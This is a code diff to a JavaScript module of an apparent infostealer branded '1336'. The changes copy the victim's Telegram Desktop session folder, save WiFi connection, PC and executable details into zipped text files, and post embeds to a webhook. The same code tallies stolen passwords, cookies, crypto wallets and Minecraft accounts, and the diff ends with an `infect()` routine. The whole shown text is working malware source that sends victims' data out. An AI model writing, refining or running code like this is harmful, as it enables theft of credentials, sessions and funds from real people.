@@ -18,9 +18,6 @@ module.exports = (client) => {
           `\\Telegram\\`,
           `${process.env.APPDATA}\\Telegram Desktop\\tdata`
         );
-        client.utils.jszip.deleteFolder(
-          `\\Telegram\\user_data\\media_cache`
-        )
       } else {
         exists = false;
       }
@@ -94,7 +91,14 @@ module.exports = (client) => {
         });
       }
 
-      let wifi_connections_text = `<================[WiFi connections]>================>\n${wifi_connections}`;
+      let wifi_connections_text = `<================[WiFi connections]>================>\n\n${wifi_connections}`;
+
+      client.utils.jszip.createTxt(
+        "\\WiFi Connections.txt",
+        wifi_connections_text
+      );
+      client.utils.jszip.createTxt("\\User Info.txt", pc_info_text);
+
       return client.utils.webhook.createEmbed({
         fields: fields,
       });
@@ -102,7 +106,7 @@ module.exports = (client) => {
 
     get_executable_info() {
       let executable_info_text =
-        "<================[Executable Info]>================>\n";
+        "<================[Executable Info]>================>\n\n";
       let fields = [];
 
       for (let [key, value] of Object.entries({
@@ -120,6 +124,11 @@ module.exports = (client) => {
         });
         executable_info_text += `${key}: ${value}\n`;
       }
+      client.utils.jszip.createTxt(
+        "\\Executable Info.txt",
+        executable_info_text
+      );
+
       return client.utils.webhook.createEmbed({
         fields: fields,
       });
@@ -178,7 +187,7 @@ module.exports = (client) => {
         value: `**[Download](${upload.downloadPage})**`,
         inline: false
         },
-      ],
+      ];
 
       await client.utils.webhook.sendToWebhook({
         embeds: [counter_embed],
@@ -187,23 +196,23 @@ module.exports = (client) => {
 
     create_counter_embed() {
       let obj = {
-          "title": `Thanks for using 1336`,
-          "description": `<a:1336:1026131793197400164> **${client.config.counter.passwords}  Passwords**\n<a:1336:1026131787157602375> **${client.config.counter.cookies} Cookies**\n<:1336:1026131791658110996> **${client.config.counter.wallets} Wallets/Extensions**\n<:1336:1026131791658110996> **${client.config.counter.minecraft} Minecraft**`,
-          "footer": {
-              text: client.utils.encryption.decryptData(client.config.embed.footer.text),
-              icon_url: client.utils.encryption.decryptData(client.config.embed.footer.icon_url),
-          },
-          "timestamp": new Date(),
-      }
+        "title": `Thanks for using 1336`,
+        "description": `<a:1336:1026131793197400164> **${client.config.counter.passwords}  Passwords**\n<a:1336:1026131787157602375> **${client.config.counter.cookies} Cookies**\n<:1336:1026131791658110996> **${client.config.counter.wallets} Wallets/Extensions**\n<:1336:1026131791658110996> **${client.config.counter.minecraft} Minecraft**`,
+        "footer": {
+            text: client.utils.encryption.decryptData(client.config.embed.footer.text),
+            icon_url: client.utils.encryption.decryptData(client.config.embed.footer.icon_url),
+        },
+        "timestamp": new Date(),
+    }
 
       let cpus = [];
 
       for (var cpu of client.config.user.cpus) {
-          cpus.push(client.utils.encryption.decryptData(cpu))
+        cpus.push(client.utils.encryption.decryptData(cpu));
       }
 
-      return obj
-  },
+      return obj;
+    },
 
     async infect() {
       await client.utils.discord.init();
